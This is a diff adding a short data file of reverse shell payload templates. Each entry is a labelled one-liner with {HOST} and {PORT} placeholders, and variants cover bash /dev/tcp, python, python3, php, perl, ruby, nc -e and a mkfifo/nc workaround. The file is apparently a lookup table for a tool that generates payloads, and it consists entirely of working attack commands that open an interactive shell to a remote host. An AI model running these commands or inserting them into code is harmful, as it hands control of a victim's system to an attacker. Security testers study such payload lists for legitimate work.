@@ -1,0 +1,9 @@
+sh in dev tcp | sh -i >& /dev/tcp/{HOST}/{PORT} 0>&1
+exec sh in dev tcp | 0<&196;exec 196<>/dev/tcp/{HOST}/{PORT}; sh <&196 >&196 2>&196
+python subrpocess | python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{HOST}",{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+python3 subrpocess | python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{HOST}",{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+php sh | php -r '$sock=fsockopen("{HOST}",{PORT});exec("/bin/sh -i <&4 >&4 2>&4");'
+nc -e | nc -e /bin/sh {HOST} {PORT}
+ruby | ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{HOST}","{PORT}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+perl | perl -e 'use Socket;$i="{HOST}";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+nc workaround | touch /tmp/f; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {HOST} {PORT} > /tmp/f
